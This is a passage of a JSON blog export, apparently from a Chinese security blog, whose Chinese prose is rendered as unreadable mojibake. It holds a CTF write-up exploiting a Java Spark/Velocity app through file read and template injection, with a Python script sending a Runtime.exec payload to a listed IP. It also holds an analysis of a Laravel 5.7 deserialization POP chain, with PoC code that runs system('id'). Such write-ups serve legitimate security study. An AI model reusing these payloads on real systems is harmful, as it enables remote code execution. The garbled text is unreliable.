å»äº†ã€‚ç­‰åˆ°ä¸­åˆæ¦‚ç»Ÿçš„å¤ä¹ è¯¾ç»“æŸäº†æ‰æœ‰æ—¶é—´å®Œæ•´çœ‹ä¸‹é¢˜ã€‚é™¤å¼€ä¸€é“web-pwn,å‰©ä¸‹ä¸¤ä¸ªphpéƒ½æ˜¯å¸¸è§„è€ƒç‚¹,å°±æ˜¯è„‘æ´è·Ÿç¯å¢ƒçœŸå¿ƒæ¶å¿ƒäººã€‚å­¦å¼Ÿä»¬ä¹Ÿè½»æ¾è§£å†³ï¼Œåº”è¯¥ä¸éœ€è¦ä»€ä¹ˆè®°å½•ã€‚æˆ‘è‡ªå·±åšäº†ä¸‹zblogè¿™é“javaé¢˜,ç®€å•è®°å½•ä¸‹ã€‚","text":"æœ€è¿‘å¿™ç€å¤ä¹ å»äº†ã€‚ç­‰åˆ°ä¸­åˆæ¦‚ç»Ÿçš„å¤ä¹ è¯¾ç»“æŸäº†æ‰æœ‰æ—¶é—´å®Œæ•´çœ‹ä¸‹é¢˜ã€‚é™¤å¼€ä¸€é“web-pwn,å‰©ä¸‹ä¸¤ä¸ªphpéƒ½æ˜¯å¸¸è§„è€ƒç‚¹,å°±æ˜¯è„‘æ´è·Ÿç¯å¢ƒçœŸå¿ƒæ¶å¿ƒäººã€‚å­¦å¼Ÿä»¬ä¹Ÿè½»æ¾è§£å†³ï¼Œåº”è¯¥ä¸éœ€è¦ä»€ä¹ˆè®°å½•ã€‚æˆ‘è‡ªå·±åšäº†ä¸‹zblogè¿™é“javaé¢˜,ç®€å•è®°å½•ä¸‹ã€‚ æœ€è¿‘ciscnèµ›åŒºç¬¬7æ‰“è¿›åˆ†åŒºèµ›ã€‚å¼ºç½‘æ¯è·Ÿç€SUæ‹¿äº†ç¬¬12ã€‚(å°±æ˜¯è‡ªå·±å¤ªæäº†,éš¾é¢˜ä¸€å¾‹å¡å£³,æœç„¶ä¸å¥½å¥½ç ”ç©¶phpè·Ÿjavaæ˜¯æ²¡æœ‰å‡ºè·¯çš„).ç„¶åä¸ºäº†å›½èµ›å‡ºäº†é“Node.jsä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šæ‹¿åˆ°åˆ«çš„èµ›åŒºå»,ä¼°è®¡çœŸæ‹¿äº†ä¼šä¸¢äººå§ã€‚å¤ä¹ çš„æ—¶é—´ä¹Ÿå¾ˆå°‘ã€‚ä¸çŸ¥é“è€ƒè¯•ä¼šä¸ä¼šç‚¸â€¦â€¦ä½†æ˜¯æ¯æ¬¡ç»“æŸä¸€ä¸ªé˜¶æ®µæ€»è¦å†™å†™æ–‡ç« çš„ã€‚æ‰€ä»¥å½¢å¼åŒ–åœ°å†™å†™ã€‚ zblogç®€å•java.å°±æ˜¯ç¯å¢ƒå¡çš„è¦æ­»ã€‚ titleå‚æ•°å­˜åœ¨æ–‡ä»¶è¯»å–ã€‚åé¢çœ‹æºç ä¼šå‘ç°æ˜¯ä»»æ„æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“çš„ã€‚è¿™é‡Œæ²¡è®°é”™çš„è¯æœ‰ä¸ªå°ç»†èŠ‚å°±æ˜¯ä¸èƒ½éšä¾¿æ’../æ¥ç©¿è¶Šè·¯å¾„ã€‚åé¢ä¼šå‘ç°å®ƒæ˜¯æ‹¼æ¥è·¯å¾„çš„æ‰€ä»¥è·¯å¾„ä¸èƒ½éšä¾¿æ„é€ ã€‚è€Œä¸”ä¼¼ä¹ä¸€å¼€å§‹å°è¯•è¯»æ–‡ä»¶çš„æ—¶å€™æœ‰ç‚¹è¿·ã€‚æ–‡ä»¶æœ«å°¾åŠ äº†ä¸ª/æ‰èƒ½è¯»åˆ°,ä¸åŠ è¯»ä¸åˆ°ã€‚ä¸çŸ¥é“æ˜¯ä»€ä¹ˆç¥å¿…æ“ä½œã€‚ç„¶ååæ¥å¥½åƒåˆç»™ä¿®å¥½äº†ï¼Ÿï¼Ÿï¼Ÿ æ€»ä¹‹fuzzä¸€ä¸‹å¯ä»¥æ‰¾åˆ°æ ¹ç›®å½•çš„ä½ç½®è¯»åˆ°/etc/passwdã€‚æ¥ç€è¯»ä¸‹/proc/self/cmdlineã€‚ 1java -jar /home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar ä¸ªäººè§‰å¾—pythonè·Ÿjavaç¯å¢ƒåœ¨æœ‰arbitary file readçš„æƒ…å†µä¸‹è¯»ä¸‹cmdlineæŒºé‡è¦çš„ã€‚åŸºæœ¬éƒ½ä¼šæš´éœ²ç»å¯¹è·¯å¾„ã€‚æ¯”å¦‚æ­¤å¤„ã€‚æ›´é‡è¦çš„æ˜¯è¿™ä¸ªtarget.å†™è¿‡mavené¡¹ç›®çš„éƒ½çŸ¥é“maven buildå¥½çš„å†…å®¹éƒ½æ”¾åœ¨targetæ–‡ä»¶å¤¹ä¸‹ã€‚æ‰€ä»¥è¿™é‡ŒåŸºæœ¬ç¡®å®šèƒ½å¤Ÿç¡®å®šæŒ‰mavené¡¹ç›®ç»“æ„æ¥è¯»æ–‡ä»¶ã€‚ åªè¦çŸ¥é“ç»“æ„å°±ç­‰äºæŠŠæ‰€æœ‰æ–‡ä»¶éƒ½æš´éœ²å‡ºæ¥äº†ã€‚å…ˆè¯»ä¸‹pom.xmlã€‚å‘ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;ctf&lt;/groupId&gt; &lt;artifactId&gt;web&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporing.outputEncoding&gt;UTF-8&lt;/project.reporing.outputEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sparkjava&lt;/groupId&gt; &lt;artifactId&gt;spark-core&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.sparkjava&lt;/groupId&gt; &lt;artifactId&gt;spark-template-velocity&lt;/artifactId&gt; &lt;version&gt;2.7.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.7.30&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity&lt;/artifactId&gt; &lt;version&gt;1.7&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;Blog&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assemble&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt;&lt;/project&gt; ä»mainclassè¿™é‡Œçš„å€¼å¯ä»¥çœ‹å‡ºåŠ è½½çš„ä¸»ç±»Blog.classã€‚æŒ‰ç…§mavené»˜è®¤æ²¡æœ‰åŒ…çš„ç»“æ„ç›´æ¥è¯»../../../../src/main/java/Blog.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import static spark.Spark.*;import java.io.*;import org.apache.velocity.Template;import org.apache.velocity.VelocityContext;import org.apache.velocity.app.VelocityEngine;import spark.template.velocity.VelocityTemplateEngine;import java.io.StringWriter;public class Blog &#123; private static void log(String fname, String content) &#123; try &#123; FileWriter writer = new FileWriter(fname, true); writer.write(content); writer.close(); &#125; catch (IOException e) &#123; &#125; &#125; public static void main(String[] arg) &#123; staticFiles.location(\"/public\"); VelocityEngine velocityEngine = new VelocityEngine(); velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, \"file\"); velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, \"/\"); velocityEngine.init(); VelocityContext context = new VelocityContext(); get(\"/\", (request, response) -&gt; &#123; request.session(true); String title = request.queryParams(\"title\"); if (title != null) &#123; log(\"/tmp/\" + request.session().id(), \"Client IP: \" + request.ip() + \" -&gt; File: \" + title + \"\\n\"); Template template = velocityEngine.getTemplate(\"/home/ctf/web/src/main/resources/templates/\" + title); StringWriter sw = new StringWriter(); template.merge(context, sw); return sw; &#125; Template template = velocityEngine.getTemplate(\"/home/ctf/web/src/main/resources/templates/index\"); StringWriter sw = new StringWriter(); template.merge(context, sw); return sw; &#125;); &#125;&#125; ä»£ç é€»è¾‘æ˜¯titleå‚æ•°é™¤äº†ä¼šæŒ‰å€¼æ‰¾åˆ°å¯¹åº”æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“ã€‚è¿˜ä¼šå°†å‚æ•°æŒ‰ç…§sessionidå­˜å‚¨åˆ°tmp/ä¸‹ã€‚é‚£ä¹ˆæ­¤å¤„åº”è¯¥å…ˆä¼ payloadå†è¿›è¡Œæ¸²æŸ“ã€‚å³å¯è§¦å‘sstiè¾¾æˆrce.sessionä¸ºnode0wjq18duzt9pg4ddli5qyyfqn3034.node0è¿™ç§å½¢å¼ã€‚idå»æ‰.node0å³å¯ã€‚ ç®€å•å†™ä¸ªexp 1234567891011121314151617import requestsurl='http://122.112.253.135/'session='node0wjq18duzt9pg4ddli5qyyfqn3034.node0'id=session.rstrip('.node0')'''data=&#123;'title':'../../../../src/main/java/Blog.java'&#125;r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)print(r.text)'''data=&#123;'title':\"#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('grep -r flag /tmp')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end\"&#125;r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)data=&#123;'title':'../../../../../../../tmp/'+id&#125;r=requests.get(url,params=data,cookies=&#123;'JSESSIONID':session&#125;)print(r.text) è¿™ä¸ªpayloadæ˜¯æ‰¾äº†ä¸ªvelocityå›æ˜¾çš„payloadå†™çš„ã€‚é€»è¾‘ä¸Šè¿˜æ˜¯åå°„å°±ä¸å¤šè¯´äº†ã€‚å…¶å®ä¹‹å‰å­¦ä¹ JavaSecé‚£ä¸ªé¡¹ç›®é‡Œçš„sstipayloadä¹Ÿèƒ½æ‰§è¡Œã€‚ä½†æ˜¯ä¼¼ä¹å¤–å¸¦æ—¶æœ‰ç‚¹é—®é¢˜ã€‚ å”¯ä¸€æ¯”è¾ƒç‹—çš„å°±æ˜¯flagåœ¨/tmpä¸‹ã€‚åœ¨tmpåˆ—ç›®å½•ä¼šå› ä¸ºsessionæ–‡ä»¶å¤ªå¤šè¿›è¡Œç›¸å…³æ“ä½œç›´æ¥å¡æ­»ã€‚ä¸€ä¸ªä¸ªè¯•å‘ç°æœ€ååªæœ‰grep -r flag /tmpä¸ä¼šå¡ã€‚åšå®Œåå‘ç°æ¢äº†ä¸ªèŠ‚ç‚¹ï¼Œflagæ”¾æ ¹ç›®å½•äº†â€¦â€¦ å°±è¿™ä¹ˆå¤šå§ã€‚å¸Œæœ›æ–°å­¦æœŸä¸€åˆ‡é¡ºåˆ©ã€‚æ¯”èµ›æˆç»©èƒ½æ›´è¿›ä¸€æ­¥ã€‚æ•´ä¸ªæš‘å‡å­¦ä¹ çš„çŸ¥è¯†,åšè¿‡çš„é¢˜ï¼Œæ‰“è¿‡çš„æ¯”èµ›è®©è¿™ä¸¤ä¸ªæœˆæ²¡æœ‰è’åºŸï¼Œæ”¶è·è¿˜æ˜¯æŒºå¤§çš„ã€‚æ¯”è¾ƒå¯æƒœçš„æ˜¯æœ¬æ¥æ‰“ç®—è·Ÿå®Œçš„Commoncollectionså‡ æ¡é“¾å­ä»¥åŠjacksonï¼Œshiroç­‰ç­‰expçš„åŸç†æ²¡èƒ½å…¨éƒ¨å®Œæˆã€‚å¸Œæœ›è¿‡æ®µæ—¶é—´èƒ½æŠŠå‘å¡«äº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"Laravel-popchain","slug":"Laravel-popchain","date":"2020-08-17T07:06:24.000Z","updated":"2021-02-18T05:09:31.880Z","comments":true,"path":"2020/08/17/Laravel-popchain/","link":"","permalink":"https://www.bycsec.top/2020/08/17/Laravel-popchain/","excerpt":"è€ƒè™‘äº†ä¸‹è¿˜æ˜¯æ‰“ç®—æŠŠlaravelçš„é“¾å­è·Ÿä¸€éã€‚çœ‹äº†ä¸‹åŸºæœ¬ä¸Šå°±5.7,5.8ä¸¤ä¸ªç‰ˆæœ¬çš„rceååºåˆ—åŒ–popchainã€‚æ‰€ä»¥å·¥ä½œé‡åº”è¯¥ä¸å¤§ã€‚æ­£å¥½æœ€è¿‘å®Œæˆtpç³»åˆ—çš„popchainå­¦ä¹ å®¡è®¡ä»£ç çš„æ„Ÿè§‰è¿˜åœ¨,é‚£å°±è¶çƒ­æ‰“é“å§ ã€‚","text":"è€ƒè™‘äº†ä¸‹è¿˜æ˜¯æ‰“ç®—æŠŠlaravelçš„é“¾å­è·Ÿä¸€éã€‚çœ‹äº†ä¸‹åŸºæœ¬ä¸Šå°±5.7,5.8ä¸¤ä¸ªç‰ˆæœ¬çš„rceååºåˆ—åŒ–popchainã€‚æ‰€ä»¥å·¥ä½œé‡åº”è¯¥ä¸å¤§ã€‚æ­£å¥½æœ€è¿‘å®Œæˆtpç³»åˆ—çš„popchainå­¦ä¹ å®¡è®¡ä»£ç çš„æ„Ÿè§‰è¿˜åœ¨,é‚£å°±è¶çƒ­æ‰“é“å§ ã€‚ å…³äºä»£ç è·å–:composer create-project --prefer-dist laravel/laravel laravel58åé¢åŠ ä¸Š&quot;5.7.*&quot;ä¸‹è½½5.7ç‰ˆæœ¬çš„ã€‚ å¦‚æœä¸‹è½½å‡ºé”™æœ€å¥½æ¢ä¸‹composeræºã€‚ä¹‹åå¯ä»¥ç›´æ¥php artisan serve --host=0.0.0.0.è¿™æ ·php-cliå°±ä¼šé»˜è®¤ä»8000ç«¯å£ç›‘å¬èµ·ä¸€ä¸ªwebæœåŠ¡ã€‚ç›´æ¥æŒ‰ç…§publicå¯¹å¤–æ˜¾ç¤ºã€‚ ç„¶åé»˜è®¤å…³äºlaravelçš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·artisanã€‚æˆ‘ä¸ªäººè®¤ä¸ºå®¡è®¡ä»£ç çš„è¯å¦‚æœæ˜¯ç™½ç›’å®¡è®¡çœ‹ä¸‹è·¯ç”±,ä¼šç”¨php artisan route:listå°±å·®ä¸å¤šäº†ã€‚å½“ç„¶åé¢å¦‚æœæ˜¯å¼€å‘çš„è¯è‚¯å®šè¦å…¨é¢å­¦ä¹ ä¸‹å…·ä½“ç”¨æ³•ã€‚ laravel5.7-unserializeé¦–å…ˆæˆ‘ä»¬éœ€è¦æ·»åŠ è·¯ç”±ä¸æ§åˆ¶å™¨ä»£ç ç»™ä¸€ä¸ªååºåˆ—åŒ–å…¥æ‰‹ç‚¹ã€‚routes/web.php 123456&lt;?phpRoute::get('/', function () &#123; return view('welcome');&#125;);Route::get(\"/demo\",\"\\App\\Http\\Controllers\\DemoController@demo\"); æ·»åŠ ä¸€ä¸ªdemoè·¯ç”±å¯¹åº”DemoControllerã€‚æ‰€ä»¥ç›´æ¥åœ¨app/Http/Controllersä¸‹å¢æ·»ä¸€ä¸ªç±»DemoControllerã€‚è¿™æ ·å‘½åç©ºé—´ä¹‹ç±»çš„ä¹Ÿä¼šè‡ªåŠ¨ç”Ÿæˆå¥½ã€‚ 123456789101112131415161718&lt;?phpnamespace App\\Http\\Controllers;class DemoController extends Controller&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); &#125; else&#123; highlight_file(__FILE__); &#125; return \"Welcome to laravel5.7\"; &#125;&#125; è¿™æ ·å°±å¯ä»¥é€šè¿‡demoè·¯ç”±è¿›è¡Œå‚æ•°ä¼ é€’ã€‚expå°è¯•æ‰§è¡Œwhoami æ¥ä¸‹æ¥å°±æ˜¯è·Ÿé“¾å­äº†ã€‚é¦–å…ˆæ˜¯å…¥æ‰‹ç‚¹æ‰¾__destruct()è‡ªä¸å¿…è¯´ã€‚æ­¤å¤„å…¥æ‰‹çš„destructå…¶å®éå¸¸å¤šã€‚æˆ‘ä»¬æ‰¾åˆ°src\\Illuminate\\Foundation\\Testing\\PendingCommand.phpã€‚å³ Illuminate/Foundation/Testing/PendingCommandç±» 12345678910111213141516171819202122232425262728293031323334public function __destruct()&#123; if ($this-&gt;hasExecuted) &#123; return; &#125; $this-&gt;run();&#125;public function run()&#123; $this-&gt;hasExecuted = true; $this-&gt;mockConsoleOutput(); try &#123; $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters); &#125; catch (NoMatchingExpectationException $e) &#123; if ($e-&gt;getMethodName() === 'askQuestion') &#123; $this-&gt;test-&gt;fail('Unexpected question \"'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'\" was asked.'); &#125; throw $e; &#125; if ($this-&gt;expectedExitCode !== null) &#123; $this-&gt;test-&gt;assertEquals( $this-&gt;expectedExitCode, $exitCode, \"Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;.\" ); &#125; return $exitCode;&#125; ç»ˆç‚¹å…¶å®å°±åœ¨runæ–¹æ³•ä¸­$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);è¿™å¥ä»£ç ã€‚å…³äºå®ƒçš„çœŸæ­£å«ä¹‰æˆ‘ä»¬å…ˆä¸å»æ·±ç©¶ã€‚ä»è¯­ä¹‰ä¸Šçœ‹ä¼¼ä¹æ˜¯è°ƒç”¨äº†å†…æ ¸è¿›è¡Œcallçš„å‘½ä»¤æ‰§è¡Œã€‚è€Œå®ƒæ˜¯åœ¨trycatchè¯­å¥ä¸­æ‰§è¡Œçš„ã€‚æ‰€ä»¥éœ€è¦åœ¨åˆ°è¿™ä¸€ä¸å‰éƒ½ä¸ä¼šå‡ºç°æŠ¥é”™ã€‚ é‡ç‚¹è·Ÿè¿›mockConsoleOutput. 123456789101112131415161718192021222324protected function mockConsoleOutput()&#123; $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [ (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(), ]); foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123; $mock-&gt;shouldReceive('askQuestion') -&gt;once() -&gt;ordered() -&gt;with(Mockery::on(function ($argument) use ($question) &#123; return $argument-&gt;getQuestion() == $question[0]; &#125;)) -&gt;andReturnUsing(function () use ($question, $i) &#123; unset($this-&gt;test-&gt;expectedQuestions[$i]); return $question[1]; &#125;); &#125; $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123; return $mock; &#125;);&#125; è¿™é‡Œå°±æœ‰ä¸€ä¸ªå°ç»†èŠ‚ã€‚çœ‹åˆ°ä¸ƒæœˆç«å¸ˆå‚…è·Ÿè¿™é‡Œæ—¶é€‰æ‹©æ‰“æ–­ç‚¹ç„¶åç›´æ¥step overå•æ­¥è·³è¿‡ã€‚å‘ç°èƒ½æ­£å¸¸æ‰§è¡Œåˆ°foreachã€‚æ‰€ä»¥å°±æ²¡å»çœ‹$mocké‚£è¡Œçš„ä»£ç ã€‚è¿™åº”è¯¥æ˜¯ä¸ºäº†å‡å°‘ä¸å¿…è¦çš„å®¡è®¡ä»£ç é‡ã€‚(å¬è¯´ä¸€è·¯çœ‹ä¸‹å»çš„è¯åˆè‡­åˆé•¿â€¦â€¦) ç°åœ¨å¯ä»¥çœ‹å‘$this-&gt;test-&gt;expectedQuestionsè¿™å¥ã€‚å…¶ä¸­expectedQuestionsæ˜¯ä¸ªæ•°ç»„ã€‚ä»æ‰§è¡Œexpæ¥çœ‹,æˆ‘ä»¬å±æ€§ä¸­å¹¶æ²¡æœ‰$this-&gt;testå¯¹è±¡.æ‰€ä»¥ä¼šè§¦å‘__get()æ—¢ç„¶å¦‚æ­¤å…¶å®å°±æ˜¯æ‰¾__getæ–¹æ³•è¿”å›å€¼å¯æ§çš„ç±»äº†ã€‚è¿™é‡Œæ‰¾åˆ°src\\Faker\\DefaultGenerator.php 1234public function __get($attribute)&#123; return $this-&gt;default;&#125; æ‰€ä»¥å¤§è‡´çš„ä¸€ä¸ªè„‰ç»œå·²ç»å‡ºæ¥äº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¯¹æŸäº›å˜é‡è¿˜æ˜¯ä¸æ¸…æ¥šã€‚åŒæ—¶ä¹Ÿä¸çŸ¥é“æ˜¯å¦ä¼šæœ‰æŠ¥é”™é€€å‡ºã€‚å› æ­¤å¯ä»¥ç”¨ä¸€ä¸ªåŠæˆå“pocæ¥æ¢æµ‹ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; public $test; protected $app; protected $command; protected $parameters; public function __construct($test, $app, $command, $parameters) &#123; $this-&gt;test = $test; $this-&gt;app = $app; $this-&gt;command = $command; $this-&gt;parameters = $parameters; &#125; &#125;&#125;namespace Faker&#123; class DefaultGenerator&#123; protected $default; public function __construct($default = null) &#123; $this-&gt;default = $default; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; public function __construct() &#123; &#125; &#125;&#125;namespace&#123; $defaultgenerator = new Faker\\DefaultGenerator(array(\"1\" =&gt; \"1\")); $application = new Illuminate\\Foundation\\Application(); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, 'system', array('id')); echo urlencode(serialize($pendingcommand));&#125; è¿™é‡ŒPendingCommandç±»çš„å››ä¸ªå‚æ•°æ˜¯åŸæ„é€ å‡½æ•°ä¸­å°±æœ‰çš„ã€‚è€Œä¸ºä»€ä¹ˆä¼šåœ¨è¿™é‡Œå‡ºç°Illuminate\\Foundation\\Applicationè¦åœ¨åé¢è§£é‡Šã€‚ æˆ‘ä»¬è¿˜æ˜¯ç›´æ¥æ‰“æ–­ç‚¹çœ‹å®ƒçš„æ‰§è¡Œã€‚å•æ­¥è·³è¿‡çš„è¯ä¼šå‘ç°åˆ°$this-&gt;app-&gt;bindä¸ºæ­¢éƒ½æ˜¯å¯ä»¥æ­£å¸¸è¿›è¡Œçš„ã€‚ç›´åˆ°$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);è¿™ä¸ªæˆ‘ä»¬å‘½ä»¤æ‰§è¡Œçš„æœ€åä¸€æ­¥æ‰æŠ›å‡ºé”™è¯¯ã€‚ä¸€è·¯è·Ÿè¿‡å»å¯ä»¥çœ‹åˆ°æŠ¥é”™å…·ä½“å†…å®¹ é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šå¾—æ·±å…¥ä¸‹è¿™è¡Œä»£ç ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä»£ç çœ‹$this-&gt;app[Kernel::class].å› ä¸ºç›´æ¥è°ƒç”¨çš„è¯æˆ‘ä»¬æ˜¯æ²¡æ³•çœ‹å‡ºKernel::classçš„ã€‚æ‰€ä»¥æ¯”è¾ƒå¥½çš„æ–¹æ³•è¿˜æ˜¯å•ç‹¬æ‹¿å‡ºæ¥çœ‹ã€‚å¯ä»¥çœ‹åˆ°ã€‚$this-&gt;appå³æˆ‘ä»¬ä¹‹å‰expä¸­å®ä¾‹åŒ–çš„Illuminate\\Foundation\\Applicationç±»çš„å¯¹è±¡.è€ŒKernel::classä¼šå›ºå®šè¿”å›å­—ç¬¦ä¸²Illuminate\\Contracts\\Console\\Kernel æ¥ä¸‹æ¥æˆ‘ä»¬å‘ç°åªè¦å•æ­¥è·³è¿‡$app = $this-&gt;app[Kernel::class];å°±ä¼šå‡ºé”™æŠ›å‡ºè·Ÿä¹‹å‰è°ƒç”¨ååºåˆ—åŒ–æ—¶ä¸€æ ·çš„é”™è¯¯ã€‚æ‰€ä»¥é—®é¢˜è‚¯å®šå‡ºåœ¨è¿™å¥ä»£ç ä¸Šã€‚é‚£ä¹ˆä¸€è·¯è·Ÿè¿›ä¼šå‘ç°æ˜¯è°ƒç”¨äº†è¿™ä¹ˆå‡ ä¸ªå‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738//Pipelineprotected function handleException($passable, Exception $e)&#123;$handler = $this-&gt;container-&gt;make(ExceptionHandler::class)......//Applicationpublic function make($abstract, array $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); if (isset($this-&gt;deferredServices[$abstract]) &amp;&amp; ! isset($this-&gt;instances[$abstract])) &#123; $this-&gt;loadDeferredProvider($abstract); &#125; return parent::make($abstract, $parameters);&#125;//Containerpublic function make($abstract, array $parameters = [])&#123; return $this-&gt;resolve($abstract, $parameters);&#125;protected function resolve($abstract, $parameters = [])&#123; $abstract = $this-&gt;getAlias($abstract); $needsContextualBuild = ! empty($parameters) || ! is_null( $this-&gt;getContextualConcrete($abstract) ); if (isset($this-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123; return $this-&gt;instances[$abstract]; &#125;...... è¿™é‡Œä¸€è·¯è·Ÿè¿‡æ¥ä¼šå‘ç°åœ¨Applicationç±»è°ƒç”¨çˆ¶ç±»ä¹Ÿå°±æ˜¯Containerç±»çš„makeæ–¹æ³•,è¿›ä¸€æ­¥åˆ°è¾¾resolveæ–¹æ³•æ—¶ã€‚æœ‰ä¸€å¤„å¯æ§ç‚¹return $this-&gt;instances[$abstract]; è¿˜è®°å¾—æˆ‘ä»¬æ˜¯è·Ÿè¿›$this-&gt;app[Kernel::class]æ¥åˆ°è¿™ä¸ªè¿”å›å€¼çš„å—?å®é™…ä¸Šæˆ‘ä»¬æœ€å¼€å§‹å¯»æ‰¾å‘½ä»¤æ‰§è¡Œæ—¶ã€‚æ˜¯ä»¥$this-&gt;app[Kernel::class]=&gt;call(xxx)å°è¯•è°ƒç”¨å‘½ä»¤çš„ã€‚é‚£ä¹ˆæ—¢ç„¶è¿™é‡Œappå¯¹è±¡å¯æ§äº†,æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„callæ–¹æ³•äº†ã€‚ è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å‰é¢é€‰æ‹©Applicationç±»çš„åŸå› ã€‚å®ƒç»§æ‰¿äº†Containerç±»ã€‚æ‰€ä»¥è°ƒç”¨çš„æ˜¯Containerçš„callæ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸‹ 123456789101112131415161718192021222324252627282930//Containerpublic function call($callback, array $parameters = [], $defaultMethod = null)&#123; return BoundMethod::call($this, $callback, $parameters, $defaultMethod);&#125;//BoundMethodpublic static function call($container, $callback, array $parameters = [], $defaultMethod = null)&#123; if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123; return static::callClass($container, $callback, $parameters, $defaultMethod); &#125; return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123; return call_user_func_array( $callback, static::getMethodDependencies($container, $callback, $parameters) ); &#125;);&#125;protected static function getMethodDependencies($container, $callback, array $parameters = [])&#123; $dependencies = []; foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123; static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies); &#125; return array_merge($dependencies, $parameters);&#125; è¿™é‡Œå‘ç°å®é™…è°ƒç”¨çš„æ˜¯BoundMethodçš„é—­åŒ…å‡½æ•°ã€‚å…³äºé—­åŒ…å‡½æ•°åœ¨jsä¸­æ›¾ç»å¬è¯´è¿‡ã€‚é—­åŒ…ä¸»è¦æ˜¯ä½¿ç”¨:ä¸€ä¸ªå†…éƒ¨å‡½æ•°å¯ä»¥å¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å‚æ•°å’Œå˜é‡ï¼Œå‚æ•°å’Œå˜é‡å°±ä¸ä¼šè¢«æ”¶å›çš„æœºåˆ¶ã€‚ 